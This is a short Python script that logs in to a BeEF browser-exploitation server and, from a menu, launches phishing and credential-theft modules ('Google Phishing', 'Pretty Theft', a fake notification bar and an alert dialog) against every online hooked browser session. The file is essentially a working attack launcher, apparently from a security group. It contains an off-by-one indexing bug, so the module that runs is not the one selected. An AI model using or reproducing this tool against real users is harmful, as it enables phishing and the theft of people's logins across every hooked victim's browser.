import os
from dotenv import load_dotenv
from beef_api import BeefAPI


load_dotenv()


HOSTNAME = os.getenv("HOSTNAME", "https://beef.nullsecsig.com")
USERNAME = os.getenv("USERNAME")
PASSWORD = os.getenv("PASSWORD")

TARGET_EXPLOIT_NAMES = ["Create Alert Dialog", "Google Phishing",
                        "Pretty Theft", "Fake Notification Bar"]


beef = BeefAPI(HOSTNAME)
beef.login(USERNAME, PASSWORD)

target_exploits = beef.get_exploits_of_names(TARGET_EXPLOIT_NAMES)

while True:
    # Print menu
    for count, exploit_name in enumerate(TARGET_EXPLOIT_NAMES):
        print(f"[{count}] {exploit_name}")

    # Get user input
    while True:
        try:
            exploit_index = int(input("Choose an exploit: "))
            break
        except:
            print("invalid input! Please try again.")
            continue

    online_sessions = beef.get_online_sessions()
    online_session_ids = [session["session"]
                          for session in online_sessions.values()]

    beef.execute_exploit(online_session_ids,
                         target_exploits[TARGET_EXPLOIT_NAMES[exploit_index - 1]]["id"])
